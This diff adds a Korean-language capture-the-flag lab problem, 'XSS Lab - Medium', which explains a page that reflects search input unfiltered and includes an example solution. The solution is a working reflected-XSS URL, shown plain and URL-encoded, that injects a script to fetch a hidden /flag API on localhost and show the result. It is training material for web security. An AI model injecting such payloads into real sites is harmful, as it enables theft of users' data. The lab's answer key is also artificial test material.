@@ -1,0 +1,22 @@
+📌 문제 제목  
+XSS Lab - Medium
+
+🎯 문제 설명  
+이 웹 페이지는 사용자의 검색어를 필터링 없이 HTML에 그대로 삽입합니다.  
+또한 페이지에는 자바스크립트를 통해서만 접근 가능한 `/flag` API가 존재합니다.  
+해당 API는 JSON 형식으로 flag를 반환하며, 브라우저 화면에는 표시되지 않습니다.
+
+당신의 목표는 Reflected XSS 취약점을 이용해 자바스크립트 코드를 삽입하고,  
+이를 통해 `/flag` API로 요청을 보낸 뒤, 응답으로 받은 flag 값을 `alert()` 창으로 출력하는 것입니다.
+
+🧠 난이도  
+중 (Medium)
+
+💡 예시 풀이  
+http://localhost:8080/?q=<script>fetch('/flag').then(r=>r.json()).then(d=>alert(d.flag))</script>
+
+※ 위 URL을 브라우저 주소창에 입력하면 flag가 팝업(alert)으로 출력됩니다.
+※ 주소창에 직접 입력할 때는 `<`, `>` 등의 문자를 URL 인코딩해야 할 수 있습니다.
+
+인코딩된 예시:
+http://localhost:8080/?q=%3Cscript%3Efetch('/flag').then(r%3D%3Er.json()).then(d%3D%3Ealert(d.flag))%3C%2Fscript%3E
